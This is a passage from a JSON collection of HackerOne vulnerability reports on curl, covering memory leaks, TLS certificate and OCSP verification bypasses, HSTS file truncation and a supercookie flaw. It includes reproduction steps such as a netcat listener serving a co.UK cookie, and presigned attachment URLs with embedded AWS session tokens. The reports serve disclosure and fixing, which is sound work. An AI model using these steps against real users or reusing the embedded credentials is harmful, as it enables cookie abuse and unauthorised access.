    "original_report": "Summary:\n--------\n\nIn `discard_newhandle` the condition in the `if` statement is always `false` for http transfer due to a negation.\nAs a result `http2_data_done` will never be called.\n\n`discard_newhandle` is supposed to close stream and free resources allocated in `http2_data_setup`\nas well as close `Curl_easy` handle when some error occurs in `push_promise`.\nFor example if `PUSH_PROMISE` frame has invailid `:scheme` pseudo header `set_transfer_url` in `push_promise` will return an error.\n\nAn attacker could send specially crafted `PUSH_PROMISE` frames to trigger the error.\nThis would result in a memory leak for every malformed frame received, consequently using all available memory.\n\nSteps To Reproduce:\n-------------------\n\n1. compile `nghttp2` with [nghttp\\_v1.59.patch (F3099706)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyxxcikmeefskjnb1d08pskwsyyn?response-content-disposition=attachment%3B%20filename%3D%22nghttp_v1.59.patch%22%3B%20filename%2A%3DUTF-8%27%27nghttp_v1.59.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TOVHMAG%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025632Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJHMEUCIA5Z5MiiVtbH%2BuevL1fqO%2BQu4%2FobGSTDoF4Rvy7%2BYGDWAiEAgzTb1iV6RhasddDlwSO7gWjEvIAHl7cGhabmz5sYgtMquwUImP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDChIiL0TTyicPIjgMCqPBSBGrB8T6TDHrAvbgepV8qEbD5oojR%2F0PaWNjqT9mX9Goq%2FOMJiyIlG%2FPtUx5nX9Tlrbht1Mu78fSaGczj50QUTjqLiVn6L%2Bqv4HUJ%2Bbk3ttix6wuezqFsSTyEef4I0Nsl5FInMSS1MJhrLKQSg7pujf0k%2FpZwBBpC49ndY9FhD8RcWBljFXIy3t%2FayB5CCqn9YsRFmauT%2F5tN1dZF8GbYZOQ1CcP1rCf%2B%2BMRkHzXWNeLvzGyPOLeqfNbiZcC2tUBbj2xnhh3SJF4MI6KugufyyrGmF%2BGq60aGvKLprpP2yF6QDpAWtX2Tx%2Fn908rmrliy0JP1oUvbd7Urm3hbT5xWqluVh3SW9t4jcYYPY0baJawTp5v%2F1z7xWdjHBr3Dmo3iQBntWbow5o0%2Bndqo0bat9ql%2B1zWjDW9W%2BV9de3DrSm9atcJliS9WFLWsKXiNu8LZI9UwgLIzt%2Bppvq%2Bapc2OK9jzRJK8DLFUPM5Kmzv1A7VQdEIf3Gf%2BFeDnqYk265vKa7s5UuLaVF%2F%2Bz8Z%2BlTSrqlaeo1cV7e6rMeFjYccdgNZQ1FZhWfX6KRXffPLLmySFM21Z1fVrJcsBxlfsF07DIl1X%2F%2FOIxqmBjCfAjrZ%2FxdhcV43Yxl%2FsqVL46g1YvgWWok0VpwtpJv4cWRaFtn6sz6dlBGltVPXarGS6tgqyZMtkWP1r3WghSqB7Vgi2rOC0r5tFsOn7d8bpIaGn36G5XoMvIELGaer5UYyY0aZoL009c1UkQqCRfN3ojZy59A2oas0YMDbfpp8j%2BfOdevGVU2BR76PIJNW7ByykuYiCvWvldkXrV7Ji3YYMZfMyfi2GkxsAhmSJu2uC1qhkgivxJa2jLoipr6scsxv95Nvwsw4LbcxgY6sQG9St%2BAifd3zssRuMQgvT%2BImniCIL%2BwI59GZ4QOtJvMvu%2BXq83WaiP6eqjqqzOlZ3U3aw7IPgf7etDtrI2gezLtIU0kixX%2F2S3HvsVag7kq8aWVVhcjbuvghdSpoDW6rVK3y6AyEng%2BM2FVABCTjggGS8cELco5kkUYE6tGmmEx2Zf1fBc5iV7SewcO7eiPwATk0M6i%2FVwREp8ZCLB2N3xUyYS9AqmAuD2n6iWt1xKnMUA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f5c4cb2890581bc8143fcfd3938cc78ee90aae3ead72bf365faffc09d1d88d33) applied\n2. compile [http2\\_push\\_promise.c (F3099707)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yriyachv59bxzbhz9ixkwwr4qal0?response-content-disposition=attachment%3B%20filename%3D%22http2_push_promise.c%22%3B%20filename%2A%3DUTF-8%27%27http2_push_promise.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TOVHMAG%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025632Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJHMEUCIA5Z5MiiVtbH%2BuevL1fqO%2BQu4%2FobGSTDoF4Rvy7%2BYGDWAiEAgzTb1iV6RhasddDlwSO7gWjEvIAHl7cGhabmz5sYgtMquwUImP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDChIiL0TTyicPIjgMCqPBSBGrB8T6TDHrAvbgepV8qEbD5oojR%2F0PaWNjqT9mX9Goq%2FOMJiyIlG%2FPtUx5nX9Tlrbht1Mu78fSaGczj50QUTjqLiVn6L%2Bqv4HUJ%2Bbk3ttix6wuezqFsSTyEef4I0Nsl5FInMSS1MJhrLKQSg7pujf0k%2FpZwBBpC49ndY9FhD8RcWBljFXIy3t%2FayB5CCqn9YsRFmauT%2F5tN1dZF8GbYZOQ1CcP1rCf%2B%2BMRkHzXWNeLvzGyPOLeqfNbiZcC2tUBbj2xnhh3SJF4MI6KugufyyrGmF%2BGq60aGvKLprpP2yF6QDpAWtX2Tx%2Fn908rmrliy0JP1oUvbd7Urm3hbT5xWqluVh3SW9t4jcYYPY0baJawTp5v%2F1z7xWdjHBr3Dmo3iQBntWbow5o0%2Bndqo0bat9ql%2B1zWjDW9W%2BV9de3DrSm9atcJliS9WFLWsKXiNu8LZI9UwgLIzt%2Bppvq%2Bapc2OK9jzRJK8DLFUPM5Kmzv1A7VQdEIf3Gf%2BFeDnqYk265vKa7s5UuLaVF%2F%2Bz8Z%2BlTSrqlaeo1cV7e6rMeFjYccdgNZQ1FZhWfX6KRXffPLLmySFM21Z1fVrJcsBxlfsF07DIl1X%2F%2FOIxqmBjCfAjrZ%2FxdhcV43Yxl%2FsqVL46g1YvgWWok0VpwtpJv4cWRaFtn6sz6dlBGltVPXarGS6tgqyZMtkWP1r3WghSqB7Vgi2rOC0r5tFsOn7d8bpIaGn36G5XoMvIELGaer5UYyY0aZoL009c1UkQqCRfN3ojZy59A2oas0YMDbfpp8j%2BfOdevGVU2BR76PIJNW7ByykuYiCvWvldkXrV7Ji3YYMZfMyfi2GkxsAhmSJu2uC1qhkgivxJa2jLoipr6scsxv95Nvwsw4LbcxgY6sQG9St%2BAifd3zssRuMQgvT%2BImniCIL%2BwI59GZ4QOtJvMvu%2BXq83WaiP6eqjqqzOlZ3U3aw7IPgf7etDtrI2gezLtIU0kixX%2F2S3HvsVag7kq8aWVVhcjbuvghdSpoDW6rVK3y6AyEng%2BM2FVABCTjggGS8cELco5kkUYE6tGmmEx2Zf1fBc5iV7SewcO7eiPwATk0M6i%2FVwREp8ZCLB2N3xUyYS9AqmAuD2n6iWt1xKnMUA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3cf970b22f2f4ac0827753a3e494b464c66eb2575a1866b000ce4e617740fb08)\n3. run `nghttpd -p/=/foo.bar --no-tls 8181`\n4. run `valgrind --leak-check=full ./http2_push_headers`\n\nfor each `-p` option `nghttpd` will send 200 `PUSH_PROMISE` frames with invalid `:scheme` header\n\nSupporting Material/References:\n-------------------------------\n\n`valgrind --leak-check=full ./http2_push_headers` output:\n\nImpact\n------\n\ndenial of service"
},
{
    "url": "https://hackerone.com/reports/2416725",
    "original_report": "Summary:\n--------\n\nCurl library has a security vulnerability where the certificate name check is bypassed when connecting to a host via its IP address. This could potentially introduce spoofing attacks or unauthorized access due to unverified server certificate.\n\nThis issue only affects the Curl with MbedTLS.\n\n* Affected versions: from libcurl 8.5.0 to and including 8.6.0 (current master versions at the time of writing)\n* Not affected versions: libcurl 8.4.0 and earlier\n\nThis issue affect all kinds of protocol over TLS session, e.g. HTTPS, FTPS, SMTPS, etc.\n\nSteps To Reproduce:\n-------------------\n\n### (Preparation) Download and build the Curl with MbedTLS:\n\n*Skip this step if you already have the Curl (>= 8.5.0) with MbedTLS.*\n\nBefore building the code, make sure you have environment to build the code in Linux, `sudo apt install build-essential`.\n\n1. Get and extract the code:\n\n2. Build MbedTLS:\n\n3. Build Curl with MbedTLS:\n\n### Reproduce the issue via Curl CLI:\n\nIf you build the Curl with MbedTLS from above, you should export the `LD_LIBRARY_PATH` and `PATH` to use the built Curl.\n\n1. Check the version of the Curl:\n\n2. Get IP from an example https server and use it to connect:\n\nYou could see that the Curl is able to connect to the server via its IP address. This not an expected behavior because the server certificate is not verified against the host name.\n\nThe expect result should be an error message like this:\n\nI just demonstrated the issue with the Curl CLI, but this issue could be exploited in any application that uses the Curl library with MbedTLS and if the connection is made via IP address.\n\nSupporting Material/References:\n-------------------------------\n\n### Cause of the issue:\n\nThis issue is caused by the skipping call of the `mbedtls_ssl_set_hostname` function in `mbed_connect_step1`. The `mbedtls_ssl_set_hostname` function is used to set the server name for the SNI extension and also for the server certificate name check. If the `mbedtls_ssl_set_hostname` function is not called, the server certificate name check will be bypassed.\n\nThe vulnerable of code snippet from `mbed_connect_step1` (`lib/vtls/mbedtls.c`) as following:\n\nIf `connssl->peer.sni` is not set, the `mbedtls_ssl_set_hostname` function will not be called and the server certificate name check will be bypassed.\n\nThe `connssl->peer` object contains the peer information, including the `sni`, `hostname`, `dispname` and `type`.\n\nBefore the handshake of TLS session, the peer information is created from `Curl_ssl_peer_init` function. The `sni` is optional and only set if the peer type is `CURL_SSL_PEER_DNS`. If peer type is `CURL_SSL_PEER_IPV4` or `CURL_SSL_PEER_IPV6`, the `sni` will be `null`. The code snippet from `Curl_ssl_peer_init` function (`lib/vtls/vtls.c`):\n\nTherefore, if the Curl connect to a IP address host, the `sni` will be `null` and the `mbedtls_ssl_set_hostname` function will not be called. The server certificate name check will be bypassed and the connection will be established without the server certificate name verification.\n\n*Noticeable, this issue is similar to [CVE-2016-3739](https://curl.se/docs/CVE-2016-3739.html). Basically, this is the bug from 7.21.0 and reintroduced in 8.5.0 to 8.6.0 with slightly different way.*\n\n### Detailed code change timeline about this issue:\n\nFirst, the fix for [CVE-2016-3739](/hacktivity/cve_discovery?id=CVE-2016-3739) is this [commit](https://github.com/curl/curl/commit/6efd2fa529a189bf41736a610f). This fix is make sure that the `mbedtls_ssl_set_hostname` function will be called always, even the host name is not for SNI extension usage, e.g. IP address or SSLv3. Because the `mbedtls_ssl_set_hostname` function is not called, MbedTLS will not check the server certificate name against the host name and complete the SSL handshake.\n\n*This bug is due to the confusion of documentation about the API. Here is the discussion about it: [link](https://github.com/Mbed-TLS/mbedtls/issues/466).*\n\nThe code fix for [CVE-2016-3739](/hacktivity/cve_discovery?id=CVE-2016-3739):\n\nA comment was even be added to avoid the confusion usage for the `mbedtls_ssl_set_hostname` function.\n\nLater on, this [commit](https://github.com/curl/curl/commit/2218c3a57e86c4ef68c5fa1e2f29e4a9a915d667#diff-fe5c86799b3988e8e1f8680edf2f24a6680b4410e851af5a0e72a1882a5631fcR565-R570) brings back the \"SNI\" usage and only call the `mbedtls_ssl_set_hostname` function when `snihost` is set. Fortunately, if `snihost` is not set, an error will be returned instead of continuing the SSL handshake without the server name check.\n\nApparently, This commit reintroduced the confusion about the `mbedtls_ssl_set_hostname` function usage back again, and just avoid the issue by unrelated error handling of SNI host name conversion.\n\nEventually, this [commit](https://github.com/curl/curl/commit/fa714830e92cba7b16b9d3f2cc92a72ee9d821fa#diff-fe5c86799b3988e8e1f8680edf2f24a6680b4410e851af5a0e72a1882a5631fcR642-R644) \"keep peer name information together\", it separated the `sni` and `hostname` in the `peer` structure, the peer information is created from another place and `sni` become optional. So the `mbedtls_ssl_set_hostname` function now is only called if `sni` is set, if not set it will continue the handshake and bypass host name verification. Therefore, the bug is reintroduced.\n\nThe possible solution is to always call the `mbedtls_ssl_set_hostname` function, even if `sni` is not set. If `sni` is `null`, it could use `peer.hostname` to pass to the `mbedtls_ssl_set_hostname` function.\n\nFurthermore, we must have to avoid this kind of \"for SNI only\" confusion in the future again. Apparently, a simple block of comment in the code is not enough to avoid it.\n\n### Curl History CVE related to [CWE-297](/hacktivity/cwe_discovery?id=cwe-297):\n\n*Just for reference, the following CVEs are related to the weakness of [CWE-297](/hacktivity/cwe_discovery?id=cwe-297):*\n\n* <https://curl.se/docs/CVE-2013-4545.html>\n* <https://curl.se/docs/CVE-2013-6422.html>\n* <https://curl.se/docs/CVE-2014-0139.html>\n* <https://curl.se/docs/CVE-2014-1263.html>\n* <https://curl.se/docs/CVE-2014-2522.html>\n* <https://curl.se/docs/CVE-2014-8151.html>\n* <https://curl.se/docs/CVE-2016-3739.html>\n\nImpact\n------\n\nThe weakness of this issue quote from [SWE-297: Improper Validation of Certificate with Host Mismatch](https://cwe.mitre.org/data/definitions/297.html):\n\n> Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the product is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.\n\nApparently, even the certificate is valid, without the server name check the attacker could use a \"valid certificate\" for a different site to \"impersonate\" a trusted host.\n\n**Common Consequences:**\n\nReference from [CWE-297: Improper Validation of Certificate with Host Mismatch](https://cwe.mitre.org/data/definitions/297.html):\n\n| Scope | Impact |\n| --- | --- |\n| Access Control | Technical Impact: Gain Privileges or Assume Identity |\n|  | The data read from the system vouched for by the certificate may not be from the expected system. |\n| Authentication Other | Technical Impact: Other |\n|  | Trust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks. |\n\n**Likelihood Of Exploit:** High"
},
{
    "url": "https://hackerone.com/reports/2402845",
    "original_report": "Summary:\n--------\n\nFor each incoming `PUSH_PROMISE` header a new `name:value` string is allocated\nand the pointer to that string is stored in the `stream->push_headers` array.\n\nLibcurl will reject `PUSH_PROMISE` frames with too many headers.\nWhen the number of headers exceeds some threshold, `on_header` returns an error.\nHowever, libcurl forgets to free the `stream->push_headers` array elements before `stream->push_headers` is freed.\nA malicious server may continuously send `PUSH_PROMISE` frames with over 1000 headers, which would eventually consume all available memory.\n\nThe same issue exists when `Curl_saferealloc` fails.\n\nSteps To Reproduce:\n-------------------\n\n1. compile `nghttp2` with [nghttp\\_v1.59.patch (F3099659)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/u4nowgbpa5rhcm8oww06asythybo?response-content-disposition=attachment%3B%20filename%3D%22nghttp_v1.59.patch%22%3B%20filename%2A%3DUTF-8%27%27nghttp_v1.59.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5XJUUMU2%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025642Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJGMEQCICpZWFv4qLrfRkEvIhHUUpKJWMi1OlkrPN%2FJFGCFGg%2FmAiAm4cH7HtcO5NUadXHk%2Fdgo4Brx8Qlv3uY57OUi9wn9VCq7BQiY%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMM1vAKy0hclFQfNEbKo8Frms2%2F%2BcOcfhb%2Bc2IvmYqXpOC5mbbQAEFrQ1HHf8diHsN51oLPtKZU1rMZWu5HSIfQIl8f1tBW7x4nW2XjWYS2wzGdg%2BOGFbzb2A9jLjrwNaPlX5b1oAVfb%2BqVNcZGzKGCBu%2FQdZSFBf0Jl85%2BCy%2BvOu357JJJjCmEVrMlrimdKNIJWvcqZIcVD9tt2%2BtN41txwsD1EXMwS1PKB%2BpTyfJVGXG1tV6llG2IzNEsF9xaM484t1T34gMzdyQzKUCe4ZqLTBWkjhAStT6zggHJHmlRGVVzm2xZ6P0US0TPsImYipXb0zws4RyUtf0j%2BBplhVE232nxJDk5CnsLE%2Fnp3DcC2vSOCCHlMAG9lfF17UfQzo%2FPLHd1UDsXhU7zd3EMl0a%2Fwk98BDPYZWnVOiKmiK0J7hxzjnhOrWjYt%2FMA1gP6Ov%2FKDQxo6402ZHHQldC88hSxlUDckPrd2FyG1nWlswYfX5HRbhUA%2FAVnA0wfOkldPOmuoHMlL9HYcv%2FfuhllgjwROwqi3Bk3jjBeMWhx1cWC%2BPRiTNPRa%2F5x3QlNA9pB2E%2F79Knk8Y3f1pPUvZHFIBoTo39X5Bw6wvXfateAe%2BP6A%2FpmWrPhTDLSuT1pBVqMZQCWYIjouTETY4sgmMOYchzRJf%2F5slDRwKh3ZpF0jHG%2FyB%2FYjX9aPpISRMYFaeFlKS8LkRX4VzlA1lXRgwnDwLR%2FPWgF55wkq8H8Zg%2BdbynqVwmc0HKQyczzy0%2BhXkubeM9jCg4hkU6jpwB4vZbLk%2BIzdNb6yN9vFHg1L09NdW5XPsS2mvPs3DtfQw%2F4bseQlQmyVaoakP5BgrZ68UztvyXXGx7m29p43wT3nx6WcTqFalzsbypQbn%2B5VNdpbK7BDD4uNzGBjqyAUiuO8rTWOGShcMPR06W3TXlVizCAjSbaGTAmXCVCt8nlOG4y8SDYaTng1THTPieSeDDzW2sD7FAHSmRemVh%2BUJDRBCyHOtwFzACE4MQLvanAa6hYj12%2BDPKHB3BGBnBG34DY%2FybBHfygcko3K74anGB6S2i3SPAf8HHxygi0uSI4u0mmedIWVvZaLTcM7jxgANV3DAJgI9MttOGiG5PKr%2B4JymnRUWQADoQxSpaq0ps6tM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd75d323d9294f53917efffc904b8413d860beac9dce5106d17f1b6903000412) applied\n2. compile [http2\\_push\\_promise.c (F3099658)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ss7y8kny7uztd49j7orx8cj635t2?response-content-disposition=attachment%3B%20filename%3D%22http2_push_promise.c%22%3B%20filename%2A%3DUTF-8%27%27http2_push_promise.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5XJUUMU2%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025642Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJGMEQCICpZWFv4qLrfRkEvIhHUUpKJWMi1OlkrPN%2FJFGCFGg%2FmAiAm4cH7HtcO5NUadXHk%2Fdgo4Brx8Qlv3uY57OUi9wn9VCq7BQiY%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMM1vAKy0hclFQfNEbKo8Frms2%2F%2BcOcfhb%2Bc2IvmYqXpOC5mbbQAEFrQ1HHf8diHsN51oLPtKZU1rMZWu5HSIfQIl8f1tBW7x4nW2XjWYS2wzGdg%2BOGFbzb2A9jLjrwNaPlX5b1oAVfb%2BqVNcZGzKGCBu%2FQdZSFBf0Jl85%2BCy%2BvOu357JJJjCmEVrMlrimdKNIJWvcqZIcVD9tt2%2BtN41txwsD1EXMwS1PKB%2BpTyfJVGXG1tV6llG2IzNEsF9xaM484t1T34gMzdyQzKUCe4ZqLTBWkjhAStT6zggHJHmlRGVVzm2xZ6P0US0TPsImYipXb0zws4RyUtf0j%2BBplhVE232nxJDk5CnsLE%2Fnp3DcC2vSOCCHlMAG9lfF17UfQzo%2FPLHd1UDsXhU7zd3EMl0a%2Fwk98BDPYZWnVOiKmiK0J7hxzjnhOrWjYt%2FMA1gP6Ov%2FKDQxo6402ZHHQldC88hSxlUDckPrd2FyG1nWlswYfX5HRbhUA%2FAVnA0wfOkldPOmuoHMlL9HYcv%2FfuhllgjwROwqi3Bk3jjBeMWhx1cWC%2BPRiTNPRa%2F5x3QlNA9pB2E%2F79Knk8Y3f1pPUvZHFIBoTo39X5Bw6wvXfateAe%2BP6A%2FpmWrPhTDLSuT1pBVqMZQCWYIjouTETY4sgmMOYchzRJf%2F5slDRwKh3ZpF0jHG%2FyB%2FYjX9aPpISRMYFaeFlKS8LkRX4VzlA1lXRgwnDwLR%2FPWgF55wkq8H8Zg%2BdbynqVwmc0HKQyczzy0%2BhXkubeM9jCg4hkU6jpwB4vZbLk%2BIzdNb6yN9vFHg1L09NdW5XPsS2mvPs3DtfQw%2F4bseQlQmyVaoakP5BgrZ68UztvyXXGx7m29p43wT3nx6WcTqFalzsbypQbn%2B5VNdpbK7BDD4uNzGBjqyAUiuO8rTWOGShcMPR06W3TXlVizCAjSbaGTAmXCVCt8nlOG4y8SDYaTng1THTPieSeDDzW2sD7FAHSmRemVh%2BUJDRBCyHOtwFzACE4MQLvanAa6hYj12%2BDPKHB3BGBnBG34DY%2FybBHfygcko3K74anGB6S2i3SPAf8HHxygi0uSI4u0mmedIWVvZaLTcM7jxgANV3DAJgI9MttOGiG5PKr%2B4JymnRUWQADoQxSpaq0ps6tM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1283d8df3aaa343ea622e6475cd57b3108089f6d8a1eb01715b444d9b9dd0bd1)\n3. run `nghttpd -p/=/foo.bar --no-tls 8181`\n4. run `valgrind --leak-check=full http2_push_promise`\n\nfor each `-p` option `nghttpd` will send 200 `PUSH_PROMISE` frames, each with 1280 headers (not counting pseudo headers)\n\nSupporting Material/References:\n-------------------------------\n\n`valgrind --leak-check=full http2_push_promise` output:\n\nImpact\n------\n\ndenial of service"
},
{
    "url": "https://hackerone.com/reports/2410774",
    "original_report": "Summary:\n--------\n\nIn `vquic-tls.c` `curl_wssl_init_ctx` errors are handled by `goto out` and having `result` be set to an error code to be returned. At the beginning of the function `result` is correctly set to `CURLE_FAILED_INIT` which allows for `goto out` to work correctly without having to set `result` however, `result`'s value is overridden at a certain point if `ctx_setup` is passed to the function. If `ctx_setup` returns 0 (the expected result) then it's assigned to `result` and any attempt after that to `goto out` without setting `result` to an error code will make the function skip the rest of its initialization and return with an error code indicating success.\n\nUnfortunately the last thing `curl_wssl_init_ctx` is supposed to setup for the ssl context is the certificate verification requirements. There are 4 places `goto out` is used without setting `result`, of those 3 can result from bad user input (bad tls13-ciphers, curves, or cafile/capath) and 1 is from trying to setup ssl key logging when having a WolfSSL build that doesn't have `wolfSSL_CTX_set_keylog_callback`.\n\nLuckily this does require the user to have passed in bogus values for one of the above parameters which I find very unlikely. Also very fortunately WolfSSL attempts to default to verify a cert rather than OpenSSL's default of not verifying. There is an option to make WolfSSL have OpenSSL compatible defaults but I don't know how common it is to have WolfSSL configured like that so I'm not sure how likely it is that people could run into this.\n\nGiven the unlikely set of configurations required to encounter this I don't think this is a \"high\" vulnerability like the CVSS claims but there is no way of manually setting the score, honestly I would have just submitted a patch to fix this but I'm not to sure on how common having WolfSSL in OpenSSL compatible mode is so I'm err'ing on the side of caution and submitting it here.\n\nI checked the other initialization functions in `vquic-tls.c` and it doesn't look like the same mistake was made in them. `result` is assigned before each use of `goto out`.\n\nSteps To Reproduce:\n-------------------\n\nBuild WolfSSL with something that sets `OPENSSL_COMPATIBLE_DEFAULTS` (I used `--enable-nginx`) and build curl with the WolfSSL backend.\nSetup a QUIC webserver with a self signed cert that matches the domain being spoofed and attempt to make a HTTP/3 connection to it using curl with a bad `--curves` list. curl connects to the site without having set `--insecure`, taking out the bad `--curves` argument curl will complain about the invalid cert.\n\nex:\n\nvs\n\nSupporting Material/References:\n-------------------------------\n\nThis was introduced in <https://github.com/curl/curl/pull/12678> so the only vulnerable version to be released is 8.6.0\n\nImpact\n------\n\nIf the stars align and the user is using such a configuration and passing bad arguments then they would be vulnerable to MITM attacks."
},
{
    "url": "https://hackerone.com/reports/2298922",
    "original_report": "Summary:\n--------\n\nIn version 8.5.0, cURL has inadvertently established a pathway for accepting revoked certificates.\nAs a result of [this correction](https://github.com/curl/curl/pull/12418/commits/7cf0391bbc3b5b2e4402ce675124cd73dbe0187e), during TLS session reuse, OCSP stapling verification will be skipped.\nHowever, the TLS session will be preserved regardless of OCSP verification results.\nAs a result, even for revoked certificates, verification is skipped during TLS session reuse.\n\nSteps To Reproduce:\n-------------------\n\n1.Identify sites with revoked certificates.\n2. `curl (1.URL) (1.URL)--cert-status`\n\nI have prepared an environment for testing. Please use as necessary.\n<https://ocsptest.ddns.net/>\n`curl https://ocsptest.ddns.net/ https://ocsptest.ddns.net/ --cert-status`\nThis website returns only the string \"test.\"\n\n* I have used [this](https://curl.se/windows/dl-8.5.0_3/curl-8.5.0_3-win64-mingw.zip) for testing.\n* To avoid complications with timing dependencies in verification, I have configured the web server to use TLS 1.2.\n  In the case of TLS 1.3, the timing of session preservation is delayed, which appeared to prevent session reuse with the above command line.\n\nHere are the execution results.\n\nThe first request becomes error, but the second one unjustly passes through the normal case.\n\nImpact\n------\n\nBypassing OCSP verification."
},
{
    "url": "https://hackerone.com/reports/2298307",
    "original_report": "Summary:\n--------\n\nHello security team,\nHope you are doing well :)\n\nI would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the `strcpy` function, which can lead to a buffer overflow if the length of the input is not properly checked. The vulnerable code snippet is located at [this link](https://github.com/curl/curl/blob/e251e858b941e29bb95a6c0d26bb45981a872585/lib/ws.c#L581).\n\nSteps To Reproduce:\n-------------------\n\n1. Trigger the WebSocket functionality with a crafted request.\n2. Provide a base64-encoded nonce value that exceeds the buffer size.\n3. Observe that the `strcpy` function is used without proper bounds checking.\n\nFix:\n----\n\nTo address this issue, it is recommended to replace the `strcpy` function with the safer alternative `strncpy` and explicitly specify the maximum length to copy. Here's an example fix:\n\nThis modification ensures that only a specified number of characters (up to the buffer size minus 1) are copied, preventing buffer overflow.\n\nReference:\n----------\n\n<https://cwe.mitre.org/data/definitions/122.html>\n\nImpact\n------\n\nThis vulnerability may allow an attacker to execute arbitrary code, potentially leading to a compromise of the application or system. An attacker could exploit this weakness by providing a specially crafted WebSocket request, causing a buffer overflow and overwriting adjacent memory."
},
{
    "url": "https://hackerone.com/reports/2236133",
    "original_report": "Summary:\n--------\n\nI've discovered a significant security flaw in cURL's file handling, particularly affecting the HSTS (HTTP Strict Transport Security) database when handling long filenames.\n\n### Vulnerability Description\n\ncURL erroneously creates temporary files with names potentially exceeding the filesystem's maximum filename length (typically 255 bytes for ext4, etc.). If a filename used in the HSTS database is longer than 243 bytes (255 bytes minus 9 for the random suffix and 4 for the '.tmp' extension), an unexpected security error occurs, leading to the HSTS database being overwritten.\n\n### Affected Code\n\n**File: curl/lib/fopen.c**\n\n**File: curl/lib/hsts.c**\n\nSteps To Reproduce:\n-------------------\n\nFirst let’s check the correct behaviour. I’ve created simple hsts file for cxsecurity.com domain\n\nSo works great. Let’s try update the database and add Facebook\n\nThe file has been successfully updated.\n\nLet’s see what will happen if the user will define filename longer that 243 (let’s use the content from previous file)\n\nLet’s validate the file size as it will be important to prove security issue.\n\nwe have 179 bytes.\n\nIf the user will use such file, curl will reset the content due to improper rename action\n\nLet’s check the file size again..\n\nNow the HSTS database is empty!\n\nTested on\n---------\n\ncurl 8.4.1-DEV (Linux) libcurl/8.4.1-DEV OpenSSL/3.0.10 zlib/1.2.13\n===================================================================\n\nPossible solutions:\n-------------------\n\n* Check the max length of supported file and create shortcut eg by using “~”\n* Create random short file name at /tmp/\n\nI believe addressing this vulnerability is crucial for maintaining the integrity of the HSTS database in cURL, and I'm keen to assist in any way possible to resolve this issue. Looking forward to your response.\n\nImpact\n------\n\nBypass HSTS"
},
{
    "url": "https://hackerone.com/reports/2212193",
    "original_report": "Summary:\n--------\n\nlibcurl fails to normalize the `hostname` and `cookie_domain` parameters passed to `psl_is_cookie_domain_acceptable` function. As a result a malicious site can set a super cookie if the victim requests the url with hostname with any upper case characters in the domain part of the hostname.\n\nlibpsl `psl_is_cookie_domain_acceptable` documentation <https://rockdaboot.github.io/libpsl/libpsl-Public-Suffix-List-functions.html#psl-is-cookie-domain-acceptable> says the following:\n\nThis is not done correctly and hence domains with uppercase characters will bypass the PSL check. Note that curl itself will later ignore the cookie domain capitalization and will match even lowercase hostname with the stored supercookie's mixed case domain.\n\nIt's also worth noting that the request `Host` header will reveal the mixed case used, which will allow the attacker to prepare the correct `Set-Cookie` domain for the attack.\n\nSteps To Reproduce:\n-------------------\n\n1. `echo -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: super=oops; domain=co.UK\\r\\nContent-Length: 0\\r\\n\" | nc -v -l -q 1 -p 8888`\n2. `curl -v -c c.txt --resolve test.co.uk:8888:testserverip http://test.co.UK:8888`\n3. `nc -v -l -p 7777`\n4. `curl -v -b c.txt --resolve other.co.uk:7777:testserverip http://other.co.uk:7777`\n\nNote that the `super` cookie is sent to the `other.com.uk` site. In fact it will be sent to any `.co.uk` hosts now.\n\nThe generated cookie file:\n\nImpact\n------\n\nBypassing supercookie protection."
},
{
    "url": "https://hackerone.com/reports/2252307",
